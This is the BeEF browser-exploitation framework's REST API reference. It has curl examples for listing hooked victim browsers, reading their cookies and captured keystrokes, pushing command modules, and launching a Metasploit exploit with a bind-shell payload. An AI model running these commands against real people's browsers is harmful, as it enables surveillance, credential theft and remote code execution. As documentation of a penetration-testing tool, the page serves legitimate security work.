## Introduction
From version 0.4.3.3 onwards, BeEF exposes a RESTful API. This allows users to script BeEF through HTTP/JSON requests.

#### Table of Contents

* [Authentication](#authentication)
* [Hooked Browsers](#hooked-browsers)
* [Browser Details](#browser-details)
* [Logs](#logs)
* [Browser's Log](#browsers-log)
* [List Command Modules](#list-command-modules)
* [Information on Specific Modules](#information-on-a-specific-module)
* [Launch a Command on a Specific Browser](#launch-a-command-on-a-specific-browser)
* [Return Information a Specific Command Previously Executed](#return-information-about-the-specific-command-module-previously-executed)
* [Send a Metasploit module](#send-a-metasploit-module)
* [Send a Module to Multiple Hooked Browsers](#send-a-module-to-multiple-hooked-browsers)
* [Send Multiple Modules to a Single Hooked Browser](#send-multiple-modules-to-a-single-hooked-browser)
* [List the DNS ruleset](#list-the-dns-ruleset)
* [List a Specific DNS Rule](#list-a-specific-dns-rule)
* [Add a New DNS Rule](#add-a-new-dns-rule)
* [Remove an Existing DNS Rule](#remove-an-existing-dns-rule)
* [Scripts](#scripts)

## Authentication

In order to use the API, a `token` parameter must always be added to requests, otherwise a 401 error (Not Authorized) is returned.

A new pseudo-random token is generated each time BeEF starts, using `BeEF::Core::Crypto::api_token`. The token is added to the `BeEF::Configuration` object.

When BeEF starts the token is printed to the console. It should look something like:

`[16:02:47][*] RESTful API key: 320f3cf4da7bf0df7566a517c5db796e73a23f47`

#### Grabbing the Token from BeEF's API

You can issue a POST request to `/api/admin/login` using the BeEF credentials you have set in the main [`config.yaml`](https://github.com/beefproject/beef/wiki/Command-Module-Config) file. This request will return the token in the response. You can parse the JSON and use it for your next requests requiring authentication.

An example with cURL:
```bash
curl -H "Content-Type: application/json" -X POST -d '{"username":"beef", "password":"beef"}' http://127.0.0.1:3000/api/admin/login

response: {"success":true,"token":"8dc651e5ee1cb06003878bb26bd0e72800caeea0"}
```

#### Grabbing the Token Directly in BeEF Code

If require access to the token and you are writing Ruby code somewhere in BeEF, it can be called using:
```ruby
BeEF::Core::Configuration.instance.get('beef.api_token')
```

## Hooked Browsers

### Handler 

* **Endpoint** 
  * `GET /api/hooks`
* **Description** 
  * The `hooks` handler gives information about the hooked browsers, both online and offline.
* **Query Parameters** 
  * N/A

### Example

#### Request 
```bash
curl http://beefserver.com:3000/api/hooks?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
```

#### Response
```json
{
    "hooked-browsers": {
        "online": {
            "0": {
                "name": "FF",
                "version": "10",
                "os": "Intel Mac OS X 10.7",
                "platform": "MacIntel",
                "session": "nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk",
                "ip": "127.0.0.1",
                "domain": "127.0.0.1",
                "port": "3000",
                "page_uri": "http://127.0.0.1:3000/demos/basic.html"
            }
        },
        "offline": {
            "0": {
                "name": "C",
                "version": "17",
                "os": "Macintosh",
                "platform": "MacIntel",
                "session": "26bxiMKoFfOeBgcvIV84qeOsEULKQIEYDH4djMbMPeoAZU4yySMIlJJ7GrAMwuMa0eX9wCKk24KOsCoT",
                "ip": "127.0.0.1",
                "domain": "127.0.0.1",
                "port": "3000",
                "page_uri": "http://127.0.0.1:3000/demos/basic.html"
}}}}
```

## Browser Details

### Handler
* **Endpoint**
  * `GET /api/hooks/{session}`
* **Description**
  * In order to retrieve details about a hooked browser (enabled plugins and technologies, cookies, screen size, etc), we 
    must specify the unique session ID that identifies the browser in the BeEF framework.
  * This ID is returned in the response to the `/api/hooks` (see last section above). The value we need from the response 
    is the `session_ key`.
* **Query Parameters** 
  * `{session}` - Session of the browser

### Example

**Request**:

```bash
curl http://beefserver.com:3000/api/hooks/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
```

**Response**:

```javascript
{ 
  "BrowserName": "O",
  "BrowserPlugins": "Shockwave Flash\nJava Applet Plug-in\nQuickTime Plug-in 7.7.1\nSharePoint Browser Plug-in\nSilverlight Plug-In\nWebEx64 General Plugin Container",
  "BrowserReportedName": "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.3; U; en) Presto/2.10.229 Version/11.62",
  "BrowserType": "{"O11":true,"O":true}",
  "BrowserVersion": "11",
  "Cookies": "BEEFHOOK=nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk",
  "HasActiveX": "No",
  "HasFlash": "Yes",
  "HasGoogleGears": "No",
  "HasWebSocket": "No",
  "HostName": "127.0.0.1",
  "JavaEnabled": "Yes",
  "OsName": "Macintosh",
  "PageReferrer": "No Referrer",
  "PageTitle": "BeEF Basic Demo",
  "PageURI": "http://127.0.0.1:3000/demos/basic.html",
  "ScreenParams": "{"width"=>1680, "height"=>1050, "colordepth"=>32}",
  "SystemPlatform": "MacIntel",
  "VBScriptEnabled": "No",
  "WindowSize": "{"width"=>1000, "height"=>729}",
  "hasPersistentCookies": "Yes",
  "hasSessionCookies": "Yes"
}
```

## Logs

### Handler
* **URL** :  /api/logs
* **Description** : The _logs_ handler gives information about hooked browser logs, both global and relative ones.
* **No parameters**

### Example

**Request** :
```bash
curl http://beefserver.com:3000/api/logs?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```
**Response (snip)**

```json
{
    "logs_count": 8,
    "logs": [
        {
            "id": 1,
            "date": "2012-03-20T16:14:11+01:00",
            "event": "127.0.0.1 just joined the horde from the domain: 127.0.0.1:3000",
            "type": "Zombie"
        },
        {
            "id": 8,
            "date": "2012-03-20T16:18:27+01:00",
            "event": "19.092s - [Focus] Browser has regained focus.",
            "type": "Event"
        }
    ]
}
```

## Browser's Log

In order to retrieve relative hooked browser logs, we must specify the unique session id that identified the browser in the BeEF framework. This information can be found from the previous _/api/hooks_ call: the _session_ key value.

### Handler 
* **URL** : GET /api/logs/:session
* **Description** : Logs on one browser
* **Parameters** : 
  * session : session of the user

### Example

**Request**:

```bash
curl http://beefserver.com:3000/api/logs/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```

**Response (snip)**

```json
{
    "logs_count": 13,
    "logs": [
        {
            "id": 1,
            "date": "2012-03-20T16:14:11+01:00",
            "event": "127.0.0.1 just joined the horde from the domain: 127.0.0.1:3000",
            "type": "Zombie"
        },
        {
            "id": 16,
            "date": "2012-03-20T16:40:18+01:00",
            "event": "6.071s - [User Typed] "an" > input#imptxt(Important Text)",
            "type": "Event"
        },
        {
            "id": 17,
            "date": "2012-03-20T16:40:19+01:00",
            "event": "7.086s - [User Typed] "tisnatc" > input#imptxt(Important Text)",
            "type": "Event"
        },
        {
            "id": 18,
            "date": "2012-03-20T16:40:20+01:00",
            "event": "8.099s - [User Typed] "hor" > input#imptxt(Important Text)",
            "type": "Event"
        }
    ]
}
```
## List Command Modules

### Handler
* **Handler** => /api/modules
* **Description** : list available command modules
* **No parameters**

### Example

**Request** 

```bash
curl http://beefserver.com:3000/api/modules?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```

**Response (snip)**

```json
{
    "0": {
        "id": 1,
        "name": "Linksys WRT54G CSRF",
        "category": "Router"
    },
    "65": {
        "id": 69,
        "name": "Redirect Browser (Rickroll)",
        "category": "Browser"
    },
    "66": {
        "id": 70,
        "name": "Replace Videos",
        "category": "Browser"
    },
    "67": {
        "id": 71,
        "name": "Create Prompt Dialog",
        "category": "Browser"
    }
}
```

## Information on a Specific Module

### Handler
* **URL** : GET /api/modules/:module_id
* **Description** : 
* **Parameters** :
  * module_id : ID of the BeEF module

### Example
**Request**:

```bash
curl http://beefserver.com:3000/api/modules/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```

**Response**:

```json
{
    "name": "prompt_dialog",
    "description": "Sends a prompt dialog to the hooked browser.",
    "category": "Browser",
    "options": [
        {
            "name": "question",
            "description": "Prompt text",
            "ui_label": "Prompt text"
        }
    ]
}
```
## Launch a Command on a Specific Browser

### Handler

* **URL** : POST /api/modules/:session/:module_id
* **Description** : launch the module given on the zombie browser given
* **Parameters** :
  * :session : session of the hooked browser
  * :module_id : ID of the BeEF module
  * + parameters needed for the module

### Example

NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON. In the following example we send the _prompt-dialog_ command module: according to the previous _/api/modules/71_ call, we can specify the _question_ input with our custom value. 

**Request** :

```bash
curl -H "Content-Type: application/json; charset=UTF-8" -d '{"question":"wtf?"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```

**Response** :

```json
{
    "success": "true",
    "command_id": "1"
}
```
## Return Information About the Specific Command Module Previously Executed

Reusing the previous example, we want to know the command module execution results (or, what the victim entered to the prompt dialog). In this case the victim entered _don't know_ :D

### Handler
* **URL** : GET /api/modules/:session/:mod_id/:cmd_id
* **Description** : Returns information on the command previously launched
* **Parameters** :
  * :session : session of the hooked browser
  * :mod_id : ID of the BeEF module
  * cmd_id : id of the command launched

### Example 

**Request** :

```bash
curl http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71/1?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```

**Response**:

```json
{
    "date": "1332260323",
    "data": "{"data":"answer=don't know"}"
}
```

## Send a Metasploit Module

### Handler
* **URL** : POST /api/modules/:session/:module_id
* **Description** : Launch a metasploit module on a given browser
* **Parameters** :
  * session : Session of the current browser
  * module_id : ID of the BeEF module
  * + Parameters needed to launch the module

### Example : 

NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON. In the following example we send the _Adobe FlateDecode Stream Predictor 02 Integer Overflow_. Metasploit modules will be listed together with BeEF modules, marked with the _metasploit_ category.

**Request** :

```bash
curl -H "Content-Type: application/json; charset=UTF-8" -d '{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/236?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```

**Response**

NOTE: in this case we cannot query BeEF nor Metasploit if module execution was successful or not.
This is why there is "command_id":"not_available" in the response.

```json
{
    "success": "true",
    "command_id": "not_available"
}
```

## Send a Module to Multiple Hooked Browsers

### Handler
* **URL** : POST /api/modules/multi_browser
* **Description** : Fire a new command module to multiple hooked browsers. Returns the command IDs of the launched module, or 0 if firing got issues.
* **Parameters** :
  * mod_id : module ID
  * mod_params : parameters needed for the module
  * hb_ids : IDs of the target hooked browsers

### Example : 

NOTE: Alert module with custom text, 2 hooked browsers. 

**Request** :

```bash
curl -H "Content-Type: application/json; charset=UTF-8" -d '{"mod_id":110,"mod_params":{"text":"vadi?"},"hb_ids":[1,2]}' -X POST http://beefserver.com:3000/api/modules/multi?token=2316d82702b83a293e2d46a0886a003a6be0a633
```

**Response**

```json
{
"1":16,
"2":17
}
```

## Send Multiple Modules to a Single Hooked Browser

### Handler
* **URL** : POST /api/modules/multi_module
* **Description** : Fire multiple command modules to a single hooked browser. Returns the command IDs of the launched modules, or 0 if firing got issues.
* **Parameters** :
  * hb : hooked browser session
  * modules : an array containing all the modules to be launched, with the following two keys:
     * mod_id : module ID
     * mod_input : module custom input
### Example : 

NOTE: Alert module with custom text, 2 hooked browsers. For modules that don't need parameters, just pass an empty JSON object like {}.

**Request** :

```bash
curl -H "Content-Type: application/json; charset=UTF-8" -d '{"hb":"vkIwVV3ok5i5vH2f8sxlkoaKqAGKCbZXdWqE9vkHNFBhI8aBBHvtZAGRO2XqFZXxThBlmKlRiVwPeAzj","modules":[{"mod_id":99,"mod_input":[{"repeat":"10"},{"repeat_string":"ABCDE"}]},{"mod_id":116,"mod_input":[{"question":"hooked?"}]},{"mod_id":128,"mod_input":[]}]}' -X POST http://beefserver.com:3000/api/modules/multi_module?token=e640483ae9bca2eb904f003f27dd4bc83936eb92
```

**Response**
NOTE: the following means the Alert Dialog module execution had issues (returning 0).
```json
{
"99":7,
"116":8,
"128":0
}
```

## List the DNS ruleset

### Handler

* **URL** : GET /api/dns/ruleset
* **Description** : Returns the current set of DNS rules.
* **No parameters**

### Example

**Request**

```bash
curl http://beefserver.com:3000/api/dns/ruleset?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
```

**Response**

```json
{
    "count": 5,
    "ruleset": [
        {
            "id": "0605e3d",
            "pattern": "example.com",
            "type": "NS",
            "response": [
                "ns.example.com"
            ]
        },
        {
            "id": "7e64183",
            "pattern": "example.com",
            "type": "MX",
            "response": [
                10,
                "mail.example.com"
            ]
        },
        {
            "id": "a972452",
            "pattern": "ns.example.com",
            "type": "A",
            "response": [
                "10.0.2.15"
            ]
        },
        {
            "id": "0d28ff1",
            "pattern": "mail.example.com",
            "type": "A",
            "response": [
                "10.0.2.16"
            ]
        },
        {
            "id": "45ce397",
            "pattern": "example.com",
            "type": "HINFO",
            "response": [
                "M68000",
                "VMS"
            ]
        }
    ]
}
```

## List a Specific DNS Rule

### Handler

* **URL** : GET /api/dns/rule/:id
* **Description** : Returns an individual DNS rule given its unique id.
* **Parameters** :
  * :id : unique identifier associated with rule

### Example

**Request**

```bash
curl http://beefserver.com:3000/api/dns/rule/7e64183?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
```

**Response**

```json
{
    "id": "7e64183",
    "pattern": "example.com",
    "type": "MX",
    "response": [
        10,
        "mail.example.com"
    ]
}
```

## Add a New DNS Rule

### Handler

* **URL** : POST /api/dns/rule
* **Description** : Adds a new DNS rule or "resource record". Does nothing if rule is already present.
* **Parameters** :
  * pattern : query pattern to recognize
  * resource : resource record type (e.g. A, CNAME, NS, etc.)
  * response : array containing response data

### Example

**Request**

```bash
curl -H "Content-Type: application/json; charset=UTF-8" -d '{"pattern": "example.com", "resource": "A", "response": [ "10.0.2.14" ]}' -X POST http://beefserver.com:3000/api/dns/rule?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
```

**Response**

```json
{
    "success": true,
    "id": "01f458a"
}
```

## Remove an Existing DNS Rule

### Handler

* **URL** : DELETE /api/dns/rule/:id
* **Description** : Removes an individual DNS rule given its unique id.
* **Parameters** :
  * :id : unique identifier associated with rule

### Example

**Request**

```bash
curl -X DELETE http://beefserver.com:3000/api/dns/rule/45ce397?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
```

**Response**

```json
{
    "success": true
}
```

## Scripts
* [[Java-1.6.0u27 mass-pwner|Script:-Java-1.6.0u27-mass-pwner]]

***
[[Persistence|Persistence]] | [[Autorun Rule Engine|Autorun Rule Engine]]